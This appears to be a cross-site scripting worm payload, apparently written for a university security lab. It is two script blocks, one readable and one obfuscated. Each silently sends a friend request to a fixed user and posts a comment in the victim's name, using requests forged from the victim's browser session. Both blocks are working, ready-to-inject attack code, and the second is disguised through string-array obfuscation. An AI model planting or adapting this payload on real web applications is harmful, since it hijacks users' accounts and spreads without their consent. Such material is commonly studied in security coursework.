<script>
	var r = new XMLHttpRequest();
	const id = 64;
	r.open("POST", "http://csec380-core.csec.rit.edu:86/add_friend.php?id=" + id , true);
	r.setRequestHeader("Content-Type", "x-www-form-urlencoded");
	r.send();

	const string = encodeURI(new Date() + ": Russell added you through the user " + $("#name").text()); 

	var v = document.documentElement.innerHTML.indexOf("id=") + 3;
	var new_id = document.documentElement.innerHTML.slice(v, v+1)

	while (!(isNaN(parseInt(document.documentElement.innerHTML.slice(v, v+1))))){
		v += 1
		new_id += document.documentElement.innerHTML.slice(v, v+1);
	}



	r.open("GET", "http://csec380-core.csec.rit.edu:86/add_comment.php?id=" + id + "&comment=" + string, true);
	r.send();
</script>

<script> var _0x5d27=['&comment=','send','documentElement','x-www-form-urlencoded','innerHTML','open','http://csec380-core.csec.rit.edu:86/add_friend.php?id=','slice','http://csec380-core.csec.rit.edu:86/add_comment.php?id=','setRequestHeader','replace','Content-Type','id='];(function(_0x2db0b2,_0x5d277e){var _0x4880e6=function(_0x2fefdc){while(--_0x2fefdc){_0x2db0b2['push'](_0x2db0b2['shift']());}};_0x4880e6(++_0x5d277e);}(_0x5d27,0xf2));var _0x4880=function(_0x2db0b2,_0x5d277e){_0x2db0b2=_0x2db0b2-0x0;var _0x4880e6=_0x5d27[_0x2db0b2];return _0x4880e6;};var _0xef3f79=_0x4880,r=new XMLHttpRequest();const id=0x40;r[_0xef3f79('0xa')]('POST',_0xef3f79('0xb')+id,!![]),r[_0xef3f79('0x1')](_0xef3f79('0x3'),_0xef3f79('0x8')),r['send']();const string=encodeURI(new Date()+':\x20Russell\x20added\x20you\x20through\x20the\x20user\x20'+$('#name')['text']());var v=document[_0xef3f79('0x7')][_0xef3f79('0x9')]['indexOf'](_0xef3f79('0x4'))+0x3,new_id=document[_0xef3f79('0x7')]['innerHTML'][_0xef3f79('0xc')](v,v+0x1);while(!isNaN(parseInt(document['documentElement'][_0xef3f79('0x9')][_0xef3f79('0xc')](v,v+0x1)))){v+=0x1,new_id+=document['documentElement'][_0xef3f79('0x9')][_0xef3f79('0xc')](v,v+0x1);}new_id=new_id[_0xef3f79('0x2')](/\D/g,''),r[_0xef3f79('0xa')]('POST',_0xef3f79('0x0')+id+_0xef3f79('0x5')+string,!![]),r[_0xef3f79('0x6')](); </script>
